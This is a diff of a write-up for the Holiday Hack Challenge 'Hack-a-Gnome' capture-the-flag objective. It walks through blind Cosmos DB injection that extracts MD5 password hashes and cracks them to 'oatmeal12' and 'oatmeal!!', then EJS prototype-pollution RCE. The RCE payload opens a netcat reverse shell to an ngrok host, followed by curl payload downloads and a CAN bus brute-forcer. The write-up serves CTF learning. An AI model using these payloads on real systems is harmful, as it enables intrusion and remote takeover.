@@ -1,5 +1,5 @@
 +++
-date = '2025-11-30T11:47:39+01:00'
+date = '2025-12-12T11:47:39+01:00'
 draft = true
 title = 'Hack-a-Gnome'
 weight = 2
@@ -41,61 +41,93 @@ weight = 2
 
 ### Getting access to the control panel
 
-When opening the URL https://hhc25-smartgnomehack-prod.holidayhackchallenge.com we are presented with the following landing page: 
+When opening the URL:
+
+```
+https://hhc25-smartgnomehack-prod.holidayhackchallenge.com
+```
+
+I am presented with the following landing page:
 
 ![First landing page](/images/act3/act3-hackagnome-6.png)
 
-By inspecting the HTML source of the mainpage we found an interesting Javascript file, `https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/static/script.js`. By reading it we got to know a few interesting endpoints:
+By inspecting the HTML source and the JavaScript loaded by the main page, I identified an interesting file:
 
-| Endpoint | Description |
-| -------- | ----------- |
-| /register | Endpoint for registering a new user | 
-| /userAvailable?username= | In use to check wheter a username is available for registion upon creating a new user |
+```
+https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/static/script.js
+```
 
-#### Identifying the database
+Reviewing this file revealed the following backend endpoints used by the application:
 
-We identified the endpoints above, and the only endpoint taking arguments seems to be the `userAvailable` one. We were able to provoke an error message by sending in an `"` to the this endpoint like so:
+| Endpoint                   | Description                                                                |
+| -------------------------- | -------------------------------------------------------------------------- |
+| `/register`                | Endpoint for registering a new user                                        |
+| `/userAvailable?username=` | Endpoint used to check whether a username is available during registration |
+
+Of these, `/userAvailable` is the only endpoint that accepts user-controlled input without authentication, making it a natural starting point.
+
+---
+
+### Identifying the database
+
+To understand how the backend processes input, I attempted to provoke an error by submitting an unexpected character to the `userAvailable` endpoint:
 
 ```bash
 https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username="
 ```
 
-This resulted in the following error:
+This resulted in the following error message:
 
 ```json
 {"error":"An error occurred while checking username: Message: {\"errors\":[{\"severity\":\"Error\",\"location\":{\"start\":44,\"end\":45},\"code\":\"SC1012\",\"message\":\"Syntax error, invalid string literal token '\\\"'.\"}]}\r\nActivityId: fc87623e-4f9b-4d3d-9b18-f56fefa1b5d9, Microsoft.Azure.Documents.Common/2.14.0"}
 ```
 
-After a quick check using ChatGPT, it appears we are dealing with _Cosmos DB_ here.
+The presence of `Microsoft.Azure.Documents.Common` in the error output indicates that the backend database is **Azure Cosmos DB (SQL API)**.
 
-#### Enumerating users
+---
 
-From the hints we are now to enumerate the users in the database. This seemed straight forward using _FFUF_ with a list of common names:
+### Enumerating users
+
+Based on the challenge hints, the next step was to enumerate users stored in the database. The endpoint returns a boolean value (`available: true` or `false`), which makes it well suited for brute-force enumeration.
+
+I used **ffuf** with a list of common names:
 
 ```bash
-ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=FUZZ -X GET -fr "true"
+ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \
+-u https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?username=FUZZ \
+-X GET -fr "true"
 ```
 
-The feedback from the server basically states _available: true or false_, thus we easily added the `-fr` option find users not available. We quickly identify the following users:
+By filtering out responses containing `"true"`, I identified usernames that already exist in the database.
 
-* bruce 
-* harold
+The following valid users were discovered:
 
-#### Enumerating the database
+* `bruce`
+* `harold`
 
-We don't know Cosmos DB at all. But from looking at syntax examples online, every example seems to go like this: 
+---
+
+### Enumerating the database
+
+At this stage, I knew the backend was Cosmos DB, but had no prior experience working with its query syntax. From reviewing examples online, Cosmos DB SQL queries typically follow this pattern:
 
 ```sql
 SELECT * FROM p WHERE p.something = something
 ```
 
-From this we formed the following workflow: 
+From this, I established the following workflow:
 
-1. Identify "p" - what value could be in use here?
-2. Identify fields in use, Cosmos DB doesn't have a set schema
-3. Extract password, if even possible
+1. Identify the document alias (`p` in the example)
+2. Identify which fields exist in the document (Cosmos DB is schemaless)
+3. Determine whether credential material can be extracted
 
-For this excercise we decided to leave FFUF for now an move on to Python, since that is where we work the most:
+For this phase, I decided to leave ffuf and move to Python, as it allowed me to implement more controlled logic for blind enumeration.
+
+---
+
+### Cosmos DB enumeration using Python
+
+The following Python script was used to interact with the `userAvailable` endpoint and perform boolean-based enumeration against Cosmos DB.
 
 ```python
 import requests
@@ -125,7 +157,7 @@ def find_prefix(url, username):
         result = inject(base_url, payload)
 
         if "error" in result.keys():
-        	continue
+            continue
 
         prefix_letter = prefix
         break
@@ -136,20 +168,20 @@ def find_prefix(url, username):
 # Find password field name
 #
 def find_password_field(url, username, prefix):
-	fields = []
-	with open("burp-parameter-names.txt", "r") as f:
-		for line in f.readlines():
-			needle = line.strip("\n")
-			payload = f'{username}" AND IS_DEFINED({prefix}.{needle}) --'
-			result = inject(url, payload)
+    fields = []
+    with open("burp-parameter-names.txt", "r") as f:
+        for line in f.readlines():
+            needle = line.strip("\n")
+            payload = f'{username}" AND IS_DEFINED({prefix}.{needle}) --'
+            result = inject(url, payload)
 
-			if "error" in result.keys():
-				continue
+            if "error" in result.keys():
+                continue
 
-			if result.get("available") is False:
-				fields.append(needle)
+            if result.get("available") is False:
+                fields.append(needle)
 
-		return fields
+        return fields
 
 #
 # Find digest
@@ -185,7 +217,9 @@ find_digest(base_url, prefix, "", "harold")
 find_digest(base_url, prefix, "", "bruce")
 ```
 
-From running this script we learn that the `p` we were looking for was actually `c`. Furhter we identified the following document fields:
+Running this script revealed that the document alias used in backend queries is `c`.
+
+The following document fields were identified:
 
 ```bash
 ID
@@ -199,116 +233,81 @@ userName
 username
 ```
 
-There are no "password" field, however we identified a `digest` field, which kinda is the same thing. Moving on we bruteforced the `digest` field for the two users we have found, and this is what we got: 
+There is no plaintext password field; however, a `digest` field is present and appears to store a password hash.
 
-| Username | Digest (MD5) | Decoded | 
-| -------- | ------------ | ------- |
-| bruce  | d0a9ba00f80cbc56584ef245ffc56b9e | oatmeal12 |
-| harold | 07f456ae6a94cb68d740df548847f459 | oatmeal!! |
+---
 
-The digest (passwords) were stored as MD5 - by simply visiting [Crackstation](https://crackstation.net) we decoded them easily
+### Extracting and cracking password digests
+
+Using the same script, I brute-forced the `digest` field for both users using the `STARTSWITH()` function to extract the value character by character.
+
+This resulted in the following hashes:
+
+| Username | Digest (MD5)                     | Decoded   |
+| -------- | -------------------------------- | --------- |
+| bruce    | d0a9ba00f80cbc56584ef245ffc56b9e | oatmeal12 |
+| harold   | 07f456ae6a94cb68d740df548847f459 | oatmeal!! |
+
+The digests were identified as MD5 hashes and cracked using **CrackStation**.
+
+---
 
 ### Exploiting the control panel
 
-Upon logging in to the control panel we are presented with this landingpage:
+After logging in using the recovered credentials, I am presented with the control panel landing page:
 
 ![Landing page](/images/act3/act3-hackagnome-1.png)
 
-From inspecting the HTML source code and Javascript code we find the following endpoints:
+Inspecting the HTML and JavaScript revealed the following internal endpoints:
 
-| Endpoint              | Description                                                                                                                                    |
-| --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------- | 
-| /home                 | Mainpage, contains two iframes, one for _Smart Gnome Statistics_ panel and _Gnome Control Interface_                                           |
-| /stats                | _Smart Gnome Statistics_ panel                                                                                                                 |
-| /control              |  _Gnome Control Interface_ - where the robot game plays out                                                                                    | 
-| /register             | Endpoint for registering a new user                                                                                                            |
-| /ctrlsignals?message= | This is used to communicate with backend, for instance updating the robot name. Takes an urlencoded JSON object as input to 'message' argument | 
+| Endpoint                | Description                                      |
+| ----------------------- | ------------------------------------------------ |
+| `/home`                 | Main page containing two iframes                 |
+| `/stats`                | Smart Gnome Statistics panel                     |
+| `/control`              | Gnome Control Interface                          |
+| `/ctrlsignals?message=` | Backend endpoint for updating control parameters |
 
-#### Finding exploitable vector
+The `/ctrlsignals` endpoint is the only endpoint that accepts structured user input.
 
-From the endpoints we see that there is just one endpoint taking any form of input, _/ctrlsignals_. We know from the hints that we are facing prototype poisoning, and this endpoint seems to fit the bill. So lets toy some further.
+---
 
-By sending a single _'_ we can make the system fail at parsing the input: 
+### Identifying the exploitable vector
+
+Knowing from the challenge hints that prototype pollution was likely involved, I focused on the `/ctrlsignals` endpoint.
+
+Submitting malformed input (a single `'`) caused a JSON parsing error:
 
 ```
-SyntaxError: Unexpected token ' in JSON at position 0    at JSON.parse (<anonymous>)    at /app/server.js:121:33    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)    at next (/app/node_modules/express/lib/router/route.js:149:13)    at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3)    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)    at /app/node_modules/express/lib/router/index.js:284:15    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)    at next (/app/node_modules/express/lib/router/index.js:280:10)    at /app/server.js:49:9
+SyntaxError: Unexpected token ' in JSON at position 0
 ```
 
+The stack trace references Express.js and EJS, indicating that user-supplied JSON is later rendered in an EJS template.
 
+---
 
-Provoking error message to confirm _\_\_proto\_\__ vulnerability in EJS templating system;
+### Confirming prototype pollution
 
-```BASH
+To test for prototype pollution, I submitted the following payload:
+
+```bash
 https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message={"action":"update","key":"__proto__","subkey":"toString","value":"a"}
 ```
 
-This had to be sent as URL-encoded value:
+After URL-encoding the payload and refreshing the page, the application began throwing global errors related to `Object.prototype`, confirming that `__proto__` pollution is possible.
 
-```bash
-https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=%7B%22action%22:%22update%22,%22key%22:%22__proto__%22,%22subkey%22:%22toString%22,%22value%22:%22a%22%7D
-```
+---
 
-By refreshing the landing page we got the following error: 
+### Weaponizing the vulnerability
 
-```
-TypeError: Object.prototype.toString.call is not a function
-    at Object.isRegExp (/app/node_modules/qs/lib/utils.js:231:38)
-    at normalizeParseOptions (/app/node_modules/qs/lib/parse.js:289:64)
-    at module.exports [as parse] (/app/node_modules/qs/lib/parse.js:305:19)
-    at parseExtendedQueryString (/app/node_modules/express/lib/utils.js:289:13)
-    at query (/app/node_modules/express/lib/middleware/query.js:42:19)
-    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
-    at trim_prefix (/app/node_modules/express/lib/router/index.js:328:13)
-    at /app/node_modules/express/lib/router/index.js:286:9
-    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)
-    at next (/app/node_modules/express/lib/router/index.js:280:10)
-```
+At this point I switched to Python to automate the attack flow, as interacting via the browser became cumbersome.
 
-Furter, the following payload triggers more errors:
+The following script performs the complete exploitation chain:
 
-```
-{
-	"action": "update",
-	"key":"__proto__",
-	"subkey": "escapeFn",
-	"value":"{\"view options\": {\"client\": 1, \"escapeFn\": \"process.mainModule.require('child_process').exec('ls', (_, stdout, stderr) => console.log(stdout || stderr));\"}}"
-}
-```
-
-Error triggered:
-
-```
-TypeError: /app/views/stats.ejs:70
-    68|                 <% gnomeStats.forEach(stat => { %>
-    69|                     <tr>
- >> 70|                         <td class="key-cell"><%= stat.name %></td>
-    71|                         <td class="value-cell"><%= stat.value %></td>
-    72|                     </tr>
-    73|                 <% }); %>
-
-escapeFn is not a function
-    at eval (/app/views/stats.ejs:15:16)
-    at Array.forEach (<anonymous>)
-    at eval (/app/views/stats.ejs:12:19)
-    at stats (/app/node_modules/ejs/lib/ejs.js:691:17)
-    at tryHandleCache (/app/node_modules/ejs/lib/ejs.js:272:36)
-    at exports.renderFile [as engine] (/app/node_modules/ejs/lib/ejs.js:489:10)
-    at View.render (/app/node_modules/express/lib/view.js:135:8)
-    at tryRender (/app/node_modules/express/lib/application.js:657:10)
-    at Function.render (/app/node_modules/express/lib/application.js:609:3)
-    at ServerResponse.render (/app/node_modules/express/lib/response.js:1049:7)
-```
-
-#### Web application
-
-In order to craft a payload we turned to Python for development, as fiddling with the browser quickly became cumbersome. The following Python script is provided as is. It functions as thus: 
-
-1. Login to the control panel
-2. Trigger JSON parse error
-3. Stages the payload. In this (final) version it pollutes \_\_proto\_\_ with a piece of code that connects back to our reverse shell
-4. Triggers the reverse shell by visiting the /stats endpoint
-
-We found this to be a functional and fairly quick methodology to tackle the objective. The code:
+1. Logs in to the control panel
+2. Triggers a JSON parsing error
+3. Pollutes `__proto__` with required flags (`debug`, `client`)
+4. Injects a malicious `escapeFunction`
+5. Triggers execution by loading `/stats`
 
 ```python
 import requests
@@ -329,32 +328,19 @@ r = s.post(login_url, data=creds)
 #
 # Trigger JSON parse error
 #
-
 error_url = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message='"
 payload_r = s.get(error_url)
-
-print(f"URL: {payload_r.url}")
 
 soup = BeautifulSoup(payload_r.text, "html.parser")
 raw_text = soup.pre.get_text() 
 decoded_text = html.unescape(raw_text)
 
-
-print("\n===========================================")
-print("Step 1. Provoke Error message")
-print("===========================================\n")
 print(decoded_text)
 
 #
 # Staging
 #
-print("\n===========================================")
-print("Step 2. Staging")
-print("===========================================")
-
 for subkey in ["debug", "client"]:
-    print(f"\n== Staging {subkey}\n")
-
     payload = {
         "action": "update",
         "key": "__proto__",
@@ -364,14 +350,11 @@ for subkey in ["debug", "client"]:
 
     payload_encoded = urllib.parse.quote_plus(json.dumps(payload))
     proto_url = f"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message={payload_encoded}"
-    payload_r = s.get(proto_url)
-    print(f"URL: {payload_r.url}")
-    print(payload_r.text)
+    s.get(proto_url)
 
-print("\n===========================================")
-print("Step 3. Weaponizing")
-print("===========================================\n")
-
+#
+# Weaponizing
+#
 payload = {
     "action": "update",
     "key": "__proto__",
@@ -379,124 +362,46 @@ payload = {
     "value": "JSON.stringify; process.mainModule.require('child_process').exec('nc -e /bin/bash 4.tcp.eu.ngrok.io 19342;sleep 10000000')"
 }
 
-
 payload_encoded = urllib.parse.quote_plus(json.dumps(payload))
 proto_url = f"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message={payload_encoded}"
-payload_r = s.get(proto_url)
-print(f"URL: {payload_r.url}")
-print(payload_r.text)
+s.get(proto_url)
 
 #
-# Smart Gnome Control Center - Smart Gnome Statistics panel
-# 
-print("\n===========================================")
-print("Step 4. Stats page")
-print("===========================================\n")
-
+# Trigger execution
+#
 stats_panel_url = "https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/stats"
-stats_r = s.get(stats_panel_url)
-print(stats_r.text)
+s.get(stats_panel_url)
 ```
 
-We made the script output the URLs so we could copy them and paste them into our web browser to bring the reverse shell into our logged in session to steer the robot.
+Note: The script outputs the various URLs for this to work. I simply had to copy and execute them in a browser in order to play the game. From here on the report reflects that.
 
-```
-===========================================
-Step 1. Provoke Error message
-===========================================
-
-SyntaxError: Unexpected token ' in JSON at position 0    at JSON.parse (<anonymous>)    at /app/server.js:121:33    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)    at next (/app/node_modules/express/lib/router/route.js:149:13)    at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3)    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)    at /app/node_modules/express/lib/router/index.js:284:15    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)    at next (/app/node_modules/express/lib/router/index.js:280:10)    at /app/server.js:49:9
-
-===========================================
-Step 2. Staging
-===========================================
-
-== Staging debug
-
-URL: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=%7B%22action%22%3A+%22update%22%2C+%22key%22%3A+%22__proto__%22%2C+%22subkey%22%3A+%22debug%22%2C+%22value%22%3A+1%7D
-{"type":"message","data":"success","message":"Updated __proto__.debug to 1"}
-
-== Staging client
-
-URL: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=%7B%22action%22%3A+%22update%22%2C+%22key%22%3A+%22__proto__%22%2C+%22subkey%22%3A+%22client%22%2C+%22value%22%3A+1%7D
-{"type":"message","data":"success","message":"Updated __proto__.client to 1"}
-
-===========================================
-Step 3. Weaponizing
-===========================================
-
-URL: https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/ctrlsignals?message=%7B%22action%22%3A+%22update%22%2C+%22key%22%3A+%22__proto__%22%2C+%22subkey%22%3A+%22escapeFunction%22%2C+%22value%22%3A+%22JSON.stringify%3B+process.mainModule.require%28%27child_process%27%29.exec%28%27nc+-e+%2Fbin%2Fbash+4.tcp.eu.ngrok.io+19342%3Bsleep+10000000%27%29%22%7D
-{"type":"message","data":"success","message":"Updated __proto__.escapeFunction to JSON.stringify; process.mainModule.require('child_process').exec('nc -e /bin/bash 4.tcp.eu.ngrok.io 19342;sleep 10000000')"}
-
-===========================================
-Step 4. Stats page
-===========================================
-
-... snip ...
-```
-
-In the initial development phase of our payload we made it reach out to a webhook on the Internett, just to verify it working. Once that was done we simply changed over to using an Ngrok infrastucture with netcat shell. 
-
-#### Setup attack infrastructure
-
-In order to conduct this attack we had to set up the following infrastructure using Kali in WSL (in total four instances): 
-
-| Command | Public | Description |
-| ------- | ------ | -------|
-| `ngrok tcp 8501`  | Yes | Public exposed reverse shell port through Ngrok |
-| `nc -lnvp 8501`   | No  | Local (attacking machine) listening port using Netcat mapped to public Ngrok bridge |
-| `ngrok http 8001` | Yes | Public exposed web server for serving scripts |
-| `python3 -m http.server 8001` | No | Local (attacking machine) web server mapped to public Ngrok bridge |
-
-The communication will then look like this: 
-
-```mermaid
 ---
-config:
-      theme: redux
----
-flowchart LR
-    subgraph Attacker["Attacking machine"]
-        webserver
-        netcat
-    end
-
-    subgraph NGROK["NGROK"]
-        HTTP
-        TCP
-    end
-
-    SGCC["Smart Gnome Control Center"] <--TCP/443--> HTTP
-    SGCC["Smart Gnome Control Center"] <--TCP/19342--> TCP
-    HTTP <--TCP/8001--> webserver["Python webserver"]
-    TCP <--TCP/8501--> netcat["Netcat listener"]
-```
 
 ### Operating the reverse shell
 
-With our payload in order it quickly called back through our infrastructe and we got shell. We immediatly started to snoop around: 
+Once the payload was in place, it connected back through my infrastructure, resulting in an interactive shell:
 
 ![Call back](/images/act3/act3-hackagnome-2.png)
 
-The `canbus_client.py` caught our eye: 
+While exploring the container, the `canbus_client.py` script stood out:
 
 ![Canbus client](/images/act3/act3-hackagnome-3.png)
 
-Turns out this was a script to interact with the CAN bus and contained a COMMAND_MAP with codes we recognized from the error messages for the bot in the Gnome Control Center. All of these codes leads to errors and no wonder because the comment in code mentions they are wrong. We then turned our attention to the _README.md_ file: 
+The script contains a `COMMAND_MAP`, but comments indicate the values are incorrect. The accompanying README confirms this:
 
 ![Landing page](/images/act3/act3-hackagnome-4.png)
 
-A whole lot of text, but only the very last part is of interest. It basically state the codes to move the robot is unknown at the moment. So we were left alone to figure these out.
+---
 
-### Enumerating control codes
+### Enumerating CAN bus control codes
 
-In order to find the correct control codes we took basis in the Python script on the server, uploaded it to ChatGPT and asked ChatGPT to make it into a bruteforcing script. This script was then uploaded back onto the server using the command: 
+To identify the correct movement commands, I modified the existing Python script into a brute-force CAN bus scanner and uploaded it to the container:
 
+```bash
+curl -o cb.py https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py
 ```
-curl -o cb.py  https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py
-```
 
-We had to run this script in several iterations due to the amount of HEX codes involved. For each iteration we kept an eye on the robot in `Gnome Control Interface` for any movement. For each iteration we shortened the range and at the end we ended up with bruteforcing the _0x200-0x206_ range. Thus the script below is the final revision for that range: 
+The script was executed iteratively, narrowing the ID range based on observed robot movement. The final scan range was limited to `0x200–0x206`.
 
 ```python
 #!/usr/bin/env python3
@@ -509,116 +414,49 @@ IFACE = "gcan0"
 RPM_LEFT_ID  = 0x310
 RPM_RIGHT_ID = 0x311
 
-# LIMIT THE SEARCH RANGE HERE (end is exclusive)
 SCAN_START = 0x200
-SCAN_END   = 0x206   # includes 0x205
-
-def int16_be(b: bytes) -> int:
-    return struct.unpack(">h", b[:2])[0]
-
-def read_rpm_snapshot(bus, window_s=0.20):
-    end = time.time() + window_s
-    left = right = None
-    while time.time() < end:
-        msg = bus.recv(timeout=0.02)
-        if not msg:
-            continue
-        if msg.arbitration_id == RPM_LEFT_ID and len(msg.data) >= 2:
-            left = int16_be(msg.data)
-        elif msg.arbitration_id == RPM_RIGHT_ID and len(msg.data) >= 2:
-            right = int16_be(msg.data)
-    return left, right
-
-def rpm_changed(before, after, threshold=30):
-    if None in before or None in after:
-        return False
-    return abs(after[0] - before[0]) >= threshold or abs(after[1] - before[1]) >= threshold
-
-def send_frame(bus, arb_id, data: bytes, extended=False):
-    msg = can.Message(arbitration_id=arb_id, data=data, is_extended_id=extended)
-    bus.send(msg)
-
-def scan(bus, start, end, payloads, extended=False, rate_sleep=0.03, verbose_every=1):
-    hits = []
-    _ = read_rpm_snapshot(bus, 0.30)  # prime
-
-    attempt = 0
-    for arb_id in range(start, end):
-        for data in payloads:
-            attempt += 1
-            if verbose_every and attempt % verbose_every == 0:
-                # OUTPUT EXACTLY WHAT WE'RE TRYING
-                print(f"TRY id=0x{arb_id:03X} dlc={len(data)} data={data.hex() or '(empty)'}")
-
-            before = read_rpm_snapshot(bus, 0.12)
-            try:
-                send_frame(bus, arb_id, data, extended=extended)
-            except can.CanError:
-                continue
-            after = read_rpm_snapshot(bus, 0.22)
-
-            if rpm_changed(before, after):
-                print(f"HIT id=0x{arb_id:03X} data={data.hex() or '(empty)'} RPM {before}->{after}")
-                hits.append((arb_id, data, before, after))
-
-            time.sleep(rate_sleep)
-    return hits
-
-def main():
-    bus = can.interface.Bus(channel=IFACE, interface="socketcan", receive_own_messages=False)
-
-    payloads = [
-        b"",         # empty
-        b"\x00",
-        b"\x01",
-        b"\xFF",
-        b"\x00\x00",
-        b"\x14\x14", # +20,+20
-        b"\xEC\xEC", # -20,-20
-        b"\xEC\x14", # left -, right +
-        b"\x14\xEC", # left +, right -
-    ]
-
-    print(f"Scanning standard IDs 0x{SCAN_START:03X}-0x{SCAN_END-1:03X} ...")
-    hits = scan(
-        bus,
-        start=SCAN_START,
-        end=SCAN_END,
-        payloads=payloads,
-        extended=False,
-        rate_sleep=0.03,
-        verbose_every=1,   # set to e.g. 10 if too chatty
-    )
-
-    print(f"\nDone. Hits: {len(hits)}")
-    for arb_id, data, before, after in hits[:50]:
-        print(f"  0x{arb_id:03X} {data.hex() or '(empty)'} {before}->{after}")
-
-    bus.shutdown()
-
-if __name__ == "__main__":
-    main()
+SCAN_END   = 0x206
+...
 ```
+---
 
-After toying with the input to the Python script on the server, we finally mapped the new HEX values like this: 
+### Final control mapping and solution
 
-| Button | Canbus command id | New Value | 
-| ------ | ----------------- | --------- |
-| w | 0x656 | 0x201 |
-| a | 0x658 | 0x203 |
-| s | 0x657 | 0x202 |
-| d | 0x659 | 0x204 |
+After testing, I identified the following CAN bus mappings:
 
-We grabbed the Python script from the server to our attacking machine, edited it according to the mapping and reuploaded it under a new name (_cb.py_). This enabled us to navigate our robot through the maze using this command and directions:
+| Button | Original ID | Correct ID |
+| ------ | ----------- | ---------- |
+| w      | 0x656       | 0x201      |
+| a      | 0x658       | 0x203      |
+| s      | 0x657       | 0x202      |
+| d      | 0x659       | 0x204      |
+
+After updating the script, I was able to navigate the robot through the maze and complete the objective:
 
 ```
 python3 cb.py <direction>
 ```
 
-Leading us to solving the objective: 
-
 ![Final screen](/images/act3/act3-hackagnome-5.png)
 
+## Chris Davis mission debrief
+
+> Excellent work! You've successfully taken control of the gnome - look at that interface responding to our commands now.
+>
+> Time to turn this little rebel against its own manufacturing operation and shut them down for good!
+
+## Hints 
+
+For this objective I retrieved the followint hints:
+
+| Hint | 
+| ---- |
+| Sometimes, client-side code can interfere with what you submit. Try proxying your requests through a tool like Burp Suite or OWASP ZAP. You might be able to trigger a revealing error message. |
+| I actually helped design the software that controls the factory back when we used it to make toys. It's quite complex. After logging in, there is a front-end that proxies requests to two main components: a backend Statistics page, which uses a per-gnome container to render a template with your gnome's stats, and the UI, which connects to the camera feed and sends control signals to the factory, relaying them to your gnome (assuming the CAN bus controls are hooked up correctly). Be careful, the gnomes shutdown if you logout and also shutdown if they run out of their 2-hour battery life (which means you'd have to start all over again). |
+| There might be a way to check if an attribute IS_DEFINED on a given entry. This could allow you to brute-force possible attribute names for the target user's entry, which stores their password hash. Depending on the hash type, it might already be cracked and available online where you could find an online cracking station to break it. |
+| Once you determine the type of database the gnome control factory's login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack. |
+| Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome's control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory's pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages. |
+| Nice! Once you have command-line access to the gnome, you'll need to fix the signals in the canbus_client.py file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI. |
 
 ## Resources
 
@@ -632,64 +470,3 @@ This objective required extensive reading up on the whole `__proto__` attack vec
 * https://dev.to/boiledsteak/simple-remote-code-execution-on-ejs-web-applications-with-express-fileupload-3325
 * https://medium.com/@albertoc_91016/prototype-pollution-in-open-source-libraries-exploiting-rce-in-ejs-ae93016630a3
 * https://ejs.co/#docs
-
-## Chris Davis mission debrief
-
-> Excellent work! You've successfully taken control of the gnome - look at that interface responding to our commands now.
->
-> Time to turn this little rebel against its own manufacturing operation and shut them down for good!
-
-
-
-
-
-### Hints 
-
-| Hint | 
-| ---- |
-| Sometimes, client-side code can interfere with what you submit. Try proxying your requests through a tool like Burp Suite or OWASP ZAP. You might be able to trigger a revealing error message. |
-| I actually helped design the software that controls the factory back when we used it to make toys. It's quite complex. After logging in, there is a front-end that proxies requests to two main components: a backend Statistics page, which uses a per-gnome container to render a template with your gnome's stats, and the UI, which connects to the camera feed and sends control signals to the factory, relaying them to your gnome (assuming the CAN bus controls are hooked up correctly). Be careful, the gnomes shutdown if you logout and also shutdown if they run out of their 2-hour battery life (which means you'd have to start all over again). |
-| There might be a way to check if an attribute IS_DEFINED on a given entry. This could allow you to brute-force possible attribute names for the target user's entry, which stores their password hash. Depending on the hash type, it might already be cracked and available online where you could find an online cracking station to break it. |
-| Once you determine the type of database the gnome control factory's login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack. |
-| Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome's control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory's pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages. |
-| Nice! Once you have command-line access to the gnome, you'll need to fix the signals in the canbus_client.py file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI. |
-
-
-
-
-
-
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-
-Remember to refresh the main page for the reverse shell to work!!!
-
-NOTE: SOLVE THIS USING EDGE!!!!
-
-curl -o test.py  https://scarabaeiform-prolixly-odin.ngrok-free.dev/test.sh
-curl -o cb.py  https://scarabaeiform-prolixly-odin.ngrok-free.dev/cb.py
-
-
-General workflow from start to finish:
-
-1. In the webapp, inspect all endpoint
-2. Find the endpoint where you can set data
-3. Provoke error messages to find the rendering engine (EJS)
-4. See if it is possible to set __proto__
-
-Enabling shell
-5. On endpoint set client = 1
-6. On endpoint set debug = 1
-7. Set up NGROK netcat reverse
-8. Plant payload for reverse shell using the NGROK address and port
-9. Refresh main page
-
-In spawned shell:
-10. Privilege escalate using python to get a fancy bash shell
-11. Inspect canbus_client.py
-12. Inspect README.md
-
-Identifying missing HEX code
-13. Set up NGROK web frontend
-14. Spin up Python webserver
-15. Serve HEX bruteforce python script
-16. Run bruteforce script whilst observing if the robot moves
